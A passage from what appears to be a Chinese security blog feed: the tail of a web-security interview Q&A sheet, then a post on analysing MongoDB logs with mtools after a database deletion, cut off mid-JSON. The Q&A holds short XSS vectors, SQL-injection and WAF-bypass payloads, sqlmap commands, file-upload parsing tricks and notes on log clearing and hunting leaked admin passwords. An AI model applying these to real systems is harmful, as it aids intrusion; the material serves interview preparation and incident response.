rel="noopener">php.net</a>）、私人域名邮箱等</li></ul></li><li>询问面试官对于自己的评价和可以改进的地方</li></ul><h1>web-sec-interview</h1><p>信息安全行业从业者(Web安全/渗透测试方向)面试题目1.1</p><h3 id="README-English-中文">README <a href="README.md">English</a> | 中文</h3><hr><ul><li><p>介绍一下自认为有趣的挖洞经历（或CTF经历）</p></li><li><p>你平时用的比较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复方案？</p></li><li><p>你平时使用哪些工具?以及对应工具的特点?</p></li><li><p>如果遇到waf的情况下如何进行sql注入/上传Webshell怎么做？请写出曾经绕过WAF的经过(SQLi，XSS，上传漏洞选一)</p><p>参考以下三篇</p></li><li><p><a href="https://xz.aliyun.com/t/265/" target="_blank" rel="noopener">我的WafBypass之道（SQL注入篇）</a><br></p></li><li><p><a href="https://xz.aliyun.com/t/337/" target="_blank" rel="noopener">我的WafBypass之道（Upload篇）</a><br></p></li><li><p><a href="https://xz.aliyun.com/t/265/" target="_blank" rel="noopener">我的WafBypass之道（Misc篇）</a><br></p></li><li><p>谈一谈Windows系统与Linux系统提权的思路？</p></li><li><p>列举出您所知道的所有开源组件高危漏洞(十个以上)</p></li><li><p>描述一个你深入研究过的 CVE 或 POC。</p></li><li><p>SQLi</p><ul><li>如何判断sql注入，有哪些方法</li></ul><blockquote><p>添加单引号，双引号，order by, rlike,sleep，benchmark，运算符，修改数据类型，报错注入语句测试</p></blockquote><ul><li><p>介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？</p></li><li><p>宽字符注入的原理？如何利用宽字符注入漏洞，payload如何构造及修复方案？</p></li></ul><blockquote><p>通俗讲，gbk，big5等编码占了两个字节，sql语句进后端后对单引号等进行了转义，转义\为%5C，当前面的%xx与%5C能结合成两个字节的字符时候，就可以使后面的单引号逃逸，从而造成注入。比较常见的gbk，%df’ =&gt;<br>%df%5c%27 =&gt; 運’ 。已经可以单引号了，剩下的就和普通注入差不多了。</p></blockquote><blockquote><p>修复方式通过设置MYSQL数据库字符集utf8mb4，PHP字符集utf-8。</p></blockquote><ul><li>你都了解哪些sql 的bypass技巧</li></ul><blockquote><p>这种太多了，网上一搜一大把。主要还是看目标站点的过滤和防护，常见bypass可以是/**/替换空格，/<em>!00000union</em>/ 等于union，或者利用前端过滤，添加尖括号&lt;&gt;。大小写什么的都太常见了，如果过滤了函数或者关键字，可以尝试其他能达到效果的同等函数，关键字比如or 1=1可以用||1替换，或者用运算符比如/，%达到相同的效果。总之，还是看要求。</p></blockquote><ul><li>sqlmap如何对一个注入点注入?</li></ul><blockquote><p>如果是get型，直接，sqlmap -u “注入点网址”.</p><p>如果是post型，可以sqlmap -u “注入点网址” –data=”post的参数”</p><p>如果是cookie型，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用*号替换，放到文件里，然后sqlmap -r “文件地址”</p></blockquote><ul><li>mysql的网站注入，5.0以上和5.0以下有什么区别？</li></ul><blockquote><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操做。</p></blockquote><ul><li>mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</li></ul><blockquote><p>root权限以及网站的绝对路径。</p></blockquote><ul><li>以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</li></ul><blockquote><p><a href="http://demo.do?DATA=AjAxNg==" target="_blank" rel="noopener">demo.do?DATA=AjAxNg==</a></p></blockquote><ul><li>发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</li></ul></li><li><p>Domain</p><ul><li>解释一下同源策略</li></ul><blockquote><p>如果两个页面的协议，端口和域名相同，则可认为是同源。</p></blockquote><ul><li>同源策略，那些东西是同源可以获取到的</li></ul><blockquote><p>读取cookie， LocalStorage 和 IndexDB<br>读取DOM元素<br>发送AJAX请求</p></blockquote><ul><li>如果子域名和顶级域名不同源，在哪里可以设置叫他们同源</li></ul><blockquote><p>大概就是子域相同，主域不同的意思吧，可以通过在两房都设置document.domain来解决跨域。</p></blockquote><ul><li>如何设置可以跨域请求数据？jsonp是做什么的？</li></ul><blockquote><p>主域相同时跨域，可以像上面那样设置document.domain.</p><p>主域不同时，可以通过jsonp，websocket，在服务端设置CORS进行跨域请求。H5新增window.postMessage方法解决跨域请求。</p><p>通过<script>像服务器请求json数据，不受同源策略限制。</p></blockquote><ul><li>jsonp的业务意义？</li></ul></li><li><p>Ajax</p><ul><li>Ajax是否遵循同源策略？</li></ul><blockquote><p>ajax全名是Asynchronous JavaScript and XML ，异步的javascript和XML技术。遵循同源策略，但是可以通过jsonp等进行规避。</p></blockquote><ul><li>JSON注入如何利用？</li></ul><blockquote><p>XSS跨站攻击</p></blockquote><ul><li>JSON和JSONP的区别？</li><li>JSONP劫持利用方式及修复方案？</li></ul></li><li><p>浏览器策略</p><ul><li>不同浏览器之间，安全策略有哪些不同，比如chrome，firefox，IE</li></ul><blockquote><p>三种浏览器都遵循同源策略，内容安全策略(CSP), Cookie安全策略（httponly, Secure, Path）</p></blockquote><ul><li>CSP是什么？如何设置CSP？</li></ul><blockquote><p>CSP：Content Security Policy，内容安全策略。是繁育XSS攻击的一种安全机制，其思想是以服务器白名单的形式来配置可信的内容来源，客户端Web应用代码可以使用这些安全来源。</p></blockquote></li><li><p>XSS</p><ul><li>XSS是什么，修复方式是？</li></ul><blockquote><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p></blockquote><ul><li>xss的发生场景？</li></ul><blockquote><p>个人理解是对用户提交数据为进行安全的过滤然后直接输入到页面当中，造成js代码的执行。至于具体场景，有输出的地方就有可能被xss的风险。</p></blockquote><ul><li>XSS持久化？</li><li>如果给你一个XSS漏洞，你还需要哪些条件可以构造一个蠕虫？</li></ul><blockquote><p>XSS蠕虫：XSS攻击可能会造成系统中用户间的互相感染，导致整个系统用户的沦陷，能够造成这种危害的XSS漏洞成为XSS蠕虫。</p><p>1、构造一个具有自我复制的反射型XSS</p><p>2、插入评论、留言框</p><p>3、用户点击链接，链接内容指向同样的XSS向量。也就是注入了蠕虫代码的的存在存储型xss的页面。链接被点击后将继续造成蠕虫传播。</p></blockquote><ul><li>在社交类的网站中，哪些地方可能会出现蠕虫？</li></ul><blockquote><p>留言板/评论/文章发布/私信…</p></blockquote><ul><li>如果叫你来防御蠕虫，你有哪些方法？</li></ul><blockquote><p>1、将本地带有破坏性的程序改名字。<br>2、关闭可执行文件。<br>3、禁止“FileSystemObject”就可以有效的控制VBS病毒的传播。具体操作方法：用regsvr32 scrrun.dll /u这条命令就可以禁止文件系统对象。<br>4、开启浏览器的安全设置。</p></blockquote><ul><li>如果给你一个XSS盲打漏洞，但是返回来的信息显示，他的后台是在内网，并且只能使用内网访问，那么你怎么利用这个XSS？</li></ul><blockquote><p>github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell.</p></blockquote><ul><li>如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？</li><li>黑盒如何检测XSS漏洞？</li></ul></li><li><p>CRLF注入</p></li><li><p>CRLF注入的原理</p><blockquote><p>CRLF是回车+换行的简称。碰得比较少，基本没挖到过这种洞，简而言之一般是可以通过提交恶意数据里面包含回车，换行来达到控制服务器响应头的效果。碰到过潜在的CRLF都是提交回车和换行之后就500了。CRLF的利用可以是XSS，恶意重定向location，还有set-cookie.</p></blockquote></li><li><p>CSRF</p><ul><li>CSRF是什么？修复方式？</li></ul><blockquote><p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范`的页面然后嵌入Token、再次输入密码、检验Referer。</p></blockquote><ul><li>CSRF漏洞的本质是什么？</li></ul><blockquote><p>CSRF即跨站请求伪造，以受害者的身份向服务器发送一个请求。本质上个人觉得是服务端在执行一些敏感操作时候对提交操作的用户的身份校检不到位。</p></blockquote></li><li><p>防御CSRF都有哪些方法，JAVA是如何防御CSRF漏洞的，token一定有用么？</p></li></ul><blockquote><p>防御CSRF一般是加上referer和csrf_token.<br>具体可以参考这篇<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html">CSRF攻击的应对之道</a></p></blockquote><ul><li>CSRF、SSRF和重放攻击有什么区别？</li></ul><blockquote><p>CSRF是跨站请求伪造攻击，由客户端发起</p><p>SSRF是服务器端请求伪造，由服务器发起</p><p>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p></blockquote><ul><li><p>SSRF</p></li><li><p>SSRF漏洞原理、利用方式及修复方案？Java和PHP的SSRF区别？</p></li><li><p>逻辑漏洞</p><ul><li>说出至少三种业务逻辑漏洞，以及修复方式？</li></ul><blockquote><p>1)密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码</p><p>2)身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份</p><p>3)验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过</p></blockquote></li><li><p>越权访问(水平/垂直/未授权)</p></li><li><p>谈谈水平/垂直/未授权越权访问的区别?</p></li><li><p>越权问题如何检测？</p></li><li><p>XML注入</p></li><li><p>XXE是什么？修复方案是？</p></li><li><p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p></li><li><p>URL重定向</p></li><li><p>URL白名单绕过</p></li><li><p>HTML5</p><ul><li>说说HTML5有哪些新的安全特性</li></ul><blockquote><p>H5新增了不少标签，在绕过xss防御方面多了不少选择。还有就是新增了本地存储，localstorage 和session storage,可以通过xss修改本地存储达到类似一个存储xss的效果。<br><code><br><video onerror=alert(1)><source><br><video>&lt;sourceonerror=“javascript:alert(1)”<br><video src=".." onloadedmetadata="alert(1)" ondurationchanged="alert(2)" ontimeupdate="alert(3)"></video><br><video>&lt;sourceonerrorsourceonerrorsourceonerrorsourceonerror=&quot;javascript:alert(1)“&gt;<br>&lt;videopostervideopostervideopostervideoposter=”javascript:alert(1)”&gt;<br></code></p></blockquote><ul><li>HTML5白名单要有哪些标签<br>参考<a href="https://segmentfault.com/a/1190000003756563">HTML5安全问题</a></li></ul></li><li><p>java</p><ul><li>你都了解哪些java框架？</li></ul><blockquote><p>struts2 ,spring,spring security, shiro 等</p></blockquote><ul><li>java的MVC结构都是做什么的，数据流向数据库的顺序是什么？</li><li>了解java沙箱吗？</li><li>ibats的参数化查询能不能有效的控制sql注入？有没有危险的方法可以造成sql注入？</li><li>说说两次struts2漏洞的原理</li><li>ongl在这个payload中起了什么作用？</li><li>\u0023是什么字符的16进制编码？为什么在payload中要用他？</li><li>java会不会发生执行系统命令的漏洞？java都有哪些语句，方法可以执行系统命令</li><li>如果叫你修复一个xss漏洞，你会在java程序的那个层里面进行修复？</li><li>xss filter在java程序的哪里设置？</li><li>说下java的类反射在安全上可能存在哪些问题</li><li>Java反序列化漏洞的原理?解决方案?</li></ul></li><li><p>PHP</p><ul><li>php里面有哪些方法可以不让错误回显？</li></ul><blockquote><p>php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。<br>在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用<br>除了上面的，还可以在执行语句前面添加@</p></blockquote><ul><li>php.ini可以设置哪些安全特性</li></ul><blockquote><p>关闭报错，设置open_basedir，禁用危险函数，打开gpc。有具体的文章介绍安全配置这一块，属于运维的工作范围。</p></blockquote><ul><li>php的%00截断的原理是什么？</li></ul><blockquote><p>存在于5.3.4版本下，一般利用在文件上传时文件名的截断，或者在对文件进行操作时候都有可能存在00阶段的情况。 如filename=test.php%00.txt 会被截断成test.php，00后面的被忽略。系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了。</p></blockquote><ul><li>php webshell检测，有哪些方法</li></ul><blockquote><p>个人知道的大体上分为静态检测和动态检测两种。静态检测比如查找危险函数，如eval，system等。动态检测是检测脚本运行时要执行的动作，比如文件操作，socket操作等。具体方法可以是通过D盾或者其他查杀软件进行查杀，现在也有基于机器学习的webshell识别。</p></blockquote><ul><li>php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？</li><li>php反序列化漏洞的原理?解决方案?</li></ul></li><li><p>中间件</p><ul><li>tomcat要做哪些安全加固？</li><li>如果tomcat重启的话，webapps下，你删除的后台会不会又回来？</li><li>常见的网站服务器中间件容器。</li></ul><blockquote><p>IIS、Apache、nginx、Lighttpd、Tomcat</p></blockquote><ul><li>JAVA有哪些比较常见的中间件容器？</li></ul><blockquote><p>Tomcat/Jetty/JBOSS/WebLogic/Coldfusion/Websphere/GlassFish</p></blockquote><ul><li>说说常见的中间件解析漏洞利用方式</li></ul><blockquote><p>IIS 6.0<br>/xx.asp/xx.jpg &quot;xx.asp&quot;是文件夹名</p><p>IIS 7.0/7.5<br>默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p><p>Nginx<br>版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>空字节代码 xxx.jpg%00.php</p><p>Apache<br>上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p><p>lighttpd<br>xx.jpg/xx.php</p></blockquote><ul><li>Redis未授权访问漏洞如何入侵利用？</li></ul></li><li><p>数据库</p><ul><li>mysql UDF提权5.1以上版本和5.1以下有什么区别,以及需要哪些条件?</li></ul><blockquote><p>1)Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p><p>2)Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p><p>3)掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</p><p>4)可以将udf.dll写入到相应目录的权限。</p></blockquote><ul><li>mysql数据库默认有哪些库？说出库的名字</li></ul><blockquote><p>infomation_schema， msyql， performance_scheme, test</p></blockquote><ul><li>mysql的用户名密码是存放在那张表里面？mysql密码采用哪种加密方式？</li></ul><blockquote><p>mysql数据库下的user表。</p></blockquote><ul><li>mysql表权限里面，除了增删改查，文件读写，还有哪些权限？</li><li>mysql安全要如何做？</li><li>sqlserver public权限要如何提权</li><li>Windows、Linux、数据库的加固降权思路，任选其一</li></ul></li><li><p>Linux</p><ul><li>简述Linux系统安全加固需要做哪些方面</li><li>你使用什么工具来判断系统是否存在后门</li><li>Linux的Selinux是什么？如何设置Selinux？</li><li>iptables工作在TCPIP模型中的哪层？</li><li>如果无法升级内核，那么如何保证系统不被已知的exp提权？</li><li>syslog里面都有哪些日志？安装软件的日志去哪找？</li><li>如何查询ssh的登录日志？如何配置syslog的日志格式？</li><li>syslog可不可以使用vi等工具直接查看？是二进制文件吗？</li><li>如果一台Linux服务器被入侵后,你会如何做应急响应?</li><li>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？</li></ul></li><li><p>应急响应</p></li><li><p>有哪几种后门实现方式？</p></li><li><p>webshell检测有什么方法思路？</p></li><li><p>Linux服务器中了木马后，请简述应急思路？</p></li><li><p>遇到新0day(比如Struts2)后，应该如何进行应急响应？</p></li><li><p>新业务上线前可以从哪些方向进行安全评估？</p></li><li><p>现有系统可以从哪些方向进行审计发现其中的安全风险？</p></li><li><p>信息采集</p><ul><li>踩点都要采集哪些信息？</li><li>DNS在渗透中的作用</li><li>如何绕过CDN获取目标网站真实IP，谈谈你的思路？</li></ul><p><a href="https://zhuanlan.zhihu.com/p/33440472">绕过CDN寻找网站真实IP的方法汇总</a></p><ul><li><p>如果给你一个网站,你的渗透测试思路是什么?<br>在获取书面授权的前提下</p></li><li><p>1.信息收集</p></li></ul><blockquote><p>1)获取域名的whois信息,获取注册者邮箱姓名电话等。</p><p>2)查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p><p>3)查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p><p>4)查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，<br>mysql,ftp,ssh弱口令等。<br>5)扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p><p>6)google hack 进一步探测网站的信息，后台，敏感文件</p></blockquote><ul><li>2.漏洞扫描</li></ul><blockquote><p>开始检测漏洞，如XSS,CSRF,SQL注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，<br>下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p></blockquote><ul><li>3.漏洞利用</li></ul><blockquote><p>利用以上的方式拿到webshell，或者其他权限</p></blockquote><ul><li>4.权限提升</li></ul><blockquote><p>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,<br>巴西烤肉<br>linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql root提权以及oracle低权限提权</p></blockquote><ul><li><p>5.日志清理</p></li><li><p>6.总结报告及修复方案</p></li><li><p>在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</p></li></ul><blockquote><p>1)丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。</p><p>2)用邮箱做关键词进行丢进搜索引擎。</p><p>3)利用搜索到的关联信息找出其他邮进而得到常用社交账号。</p><p>4)社工找出社交账号，里面或许会找出管理员设置密码的习惯 。</p><p>5)利用已有信息生成专用字典。</p><p>6)观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。</p></blockquote><ul><li>判断出网站的CMS对渗透有什么意义？</li></ul><blockquote><p>1)查找网上已曝光的程序漏洞。</p><p>2)如果开源，还能下载相对应的源码进行代码审计。</p><p>3)一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p><p>4)敏感文件、二级目录扫描</p><p>5)站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p></blockquote></li></ul><hr><p>后续会慢慢整理为一篇interview，成为自己的东西</p></script></p></blockquote></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      来自于github各位大佬的interview方便自己在iphone查看 /滑稽
    
    </summary>
    
    
      <category term="security" scheme="https://hexchristmas.github.io/tags/security/"/>
    
      <category term="interview" scheme="https://hexchristmas.github.io/tags/interview/"/>
    
  </entry>
  
  <entry>
    <title>mtools——mongodb日志分析工具</title>
    <link href="https://hexchristmas.github.io/p/b9bb.html"/>
    <id>https://hexchristmas.github.io/p/b9bb.html</id>
    <published>2020-05-31T22:03:12.000Z</published>
    <updated>2020-05-31T14:07:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1>mtools——mongodb日志分析工具</h1><h2 id="项目地址">项目地址</h2><p><a href="https://github.com/rueckstiess/mtools" target="_blank" rel="noopener">https://github.com/rueckstiess/mtools</a></p><h2 id="为什么要用它？">为什么要用它？</h2><p>今天应急过程中，客户mongodb数据库被删了，原因是mongo未授权，需要溯源攻击者IP，数据库是什么时候被删的，以什么权限被删的，哪个用户</p><h2 id="部署">部署</h2><p>可以通过pip3进行安装，当然这也是最简单的办法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install mtools</span><br><span class="line">sudo pip3 install mtools[all]</span><br><span class="line">/* 需要python3.6或更高版本 */</span><br></pre></td></tr></table></figure><p>通过git部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rueckstiess/mtools</span><br><span class="line"><span class="built_in">cd</span> mtools</span><br><span class="line">sudo pip3 install -r requirements.txt</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>过程中我用到的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mloginfo logs --connections //统计ip连接</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">source: logs</span><br><span class="line">  host: *:27017</span><br><span class="line"> start: 2018 Jul 31 13:40:30.757</span><br><span class="line">   end: 2020 May 31 04:36:13.772</span><br><span class="line">date format: iso8601-local</span><br><span class="line">timezone: UTC +0800</span><br><span class="line">length: 1845952</span><br><span class="line">binary: mongod</span><br><span class="line">version: 4.0.0</span><br><span class="line">storage: wiredTiger</span><br><span class="line"></span><br><span class="line">CONNECTIONS</span><br><span class="line">total opened: 55893</span><br><span class="line">total closed: 55404</span><br><span class="line">no unique IPs: 1109</span><br><span class="line">socket exceptions: 52</span><br><span class="line"></span><br><span class="line">112.124.*.70   opened: 18537     closed: 18516</span><br><span class="line">127.0.0.1        opened: 5140      closed: 4722</span><br><span class="line">106.13.*.238    opened: 1250      closed: 1250</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mlogfilter logs --from May --slow 1000 --operation remove --json</span><br><span class="line">----</span><br><span class="line">logs：日志名称</span><br><span class="line">--from：日期</span><br><span class="line">--slow：慢查询</span><br><span class="line">--operation：操作类型</span><br><span class="line">--json：以json输出</span><br></pre></td></tr></table></figure><p>然后你就会看到一堆json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"line_str"</span>: <span class="string">"2020-05-10T11:39:39.065+0800 I WRITE [conn9] remove bookcircle.msgQueue command: &#123; q: &#123; receiver: \"5cca30682f29113ecdcc9230\", deviceId: \"imei860219041784179\", type: 21 &#125;, limit: 0 &#125; planSummary: IXSCAN &#123; receiver: 1 &#125; keysExamined:546 docsExamined:546 ndeleted:0 numYields:38 locks:&#123; Global: &#123; acquireCount: &#123; r: 39, w: 39 &#125; &#125;, Database: &#123; acquireCount: &#123; w: 39 &#125; &#125;, Collection: &#123; acquireCount: &#123; w: 39 &#125; &#125; &#125; 1549ms"</span>,</span><br><span class="line"><span class="attr">"split_tokens"</span>: [<span class="string">"2020-05-10T11:39:39.065+0800"</span>, <span class="string">"I"</span>, <span class="string">"WRITE"</span>, <span class="string">"[conn9]"</span>, <span class="string">"remove"</span>, <span class="string">"bookcircle.msgQueue"</span>, <span class="string">"command:"</span>, <span class="string">"&#123;"</span>, <span class="string">"q:"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"\"5cca30682f29113ecdcc9230\","</span>, <span class="string">"deviceId:"</span>, <span class="string">"\"imei860219041784179\","</span>, <span class="string">"type:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;,"</span>, <span class="string">"limit:"</span>, <span class="string">"0"</span>, <span class="string">"&#125;"</span>, <span class="string">"planSummary:"</span>, <span class="string">"IXSCAN"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"1"</span>, <span class="string">"&#125;"</span>, <span class="string">"keysExamined:546"</span>, <span class="string">"docsExamined:546"</span>, <span class="string">"ndeleted:0"</span>, <span class="string">"numYields:38"</span>, <span class="string">"locks:&#123;"</span>, <span class="string">"Global:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"r:"</span>, <span class="string">"39,"</span>, <span class="string">"w:"</span>, <span class="string">"39"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Database:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"39"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Collection:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"39"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"1549ms"</span>],</span><br><span class="line"><span class="attr">"datetime"</span>: <span class="string">"2020-05-10T11:39:39.065000+08:00"</span>,</span><br><span class="line"><span class="attr">"operation"</span>: <span class="string">"remove"</span>,</span><br><span class="line"><span class="attr">"thread"</span>: <span class="string">"conn9"</span>,</span><br><span class="line"><span class="attr">"namespace"</span>: <span class="string">"bookcircle.msgQueue"</span>,</span><br><span class="line"><span class="attr">"nscanned"</span>: <span class="number">546</span>,</span><br><span class="line"><span class="attr">"ndeleted"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"duration"</span>: <span class="number">1549</span>,</span><br><span class="line"><span class="attr">"numYields"</span>: <span class="number">38</span></span><br><span class="line">&#125; &#123;</span><br><span class="line"><span class="attr">"line_str"</span>: <span class="string">"2020-05-10T14:23:33.371+0800 I WRITE [conn134] remove bookcircle.msgQueue command: &#123; q: &#123; receiver: \"5cc2bbc02f291109cec898af\", deviceId: \"idc35e1c8f-55ff-4ff3-86f6-2c6e767dc016\", type: 21 &#125;, limit: 0 &#125; planSummary: IXSCAN &#123; receiver: 1 &#125; keysExamined:219 docsExamined:219 ndeleted:0 numYields:26 locks:&#123; Global: &#123; acquireCount: &#123; r: 27, w: 27 &#125; &#125;, Database: &#123; acquireCount: &#123; w: 27 &#125; &#125;, Collection: &#123; acquireCount: &#123; w: 27 &#125; &#125; &#125; 1126ms"</span>,</span><br><span class="line"><span class="attr">"split_tokens"</span>: [<span class="string">"2020-05-10T14:23:33.371+0800"</span>, <span class="string">"I"</span>, <span class="string">"WRITE"</span>, <span class="string">"[conn134]"</span>, <span class="string">"remove"</span>, <span class="string">"bookcircle.msgQueue"</span>, <span class="string">"command:"</span>, <span class="string">"&#123;"</span>, <span class="string">"q:"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"\"5cc2bbc02f291109cec898af\","</span>, <span class="string">"deviceId:"</span>, <span class="string">"\"idc35e1c8f-55ff-4ff3-86f6-2c6e767dc016\","</span>, <span class="string">"type:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;,"</span>, <span class="string">"limit:"</span>, <span class="string">"0"</span>, <span class="string">"&#125;"</span>, <span class="string">"planSummary:"</span>, <span class="string">"IXSCAN"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"1"</span>, <span class="string">"&#125;"</span>, <span class="string">"keysExamined:219"</span>, <span class="string">"docsExamined:219"</span>, <span class="string">"ndeleted:0"</span>, <span class="string">"numYields:26"</span>, <span class="string">"locks:&#123;"</span>, <span class="string">"Global:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"r:"</span>, <span class="string">"27,"</span>, <span class="string">"w:"</span>, <span class="string">"27"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Database:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"27"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span 